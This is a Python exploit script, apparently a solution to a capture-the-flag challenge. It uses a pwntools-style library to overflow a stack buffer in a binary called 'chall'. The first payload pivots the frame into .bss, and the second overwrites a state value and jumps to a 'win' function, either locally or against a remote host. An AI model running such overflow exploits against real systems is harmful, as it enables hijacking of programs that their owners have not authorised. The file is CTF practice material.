#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b *vuln+53
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    offset = 32
    bss = 0x404530 # state - 0x10

    payload1 = flat({
        offset: [
            bss + 0x20,
            exe.sym["vuln"]+8
        ]
    })

    state = 0xf1eeee2d # Our value need to change
    payload2 = b"A" * 0xf + p64(state) + b"B" * 0x10 + p64(exe.sym["win"])

    sa(b"?", payload1)
    sa(b"?", payload2)

    interactive()

if __name__ == '__main__':
  exploit()
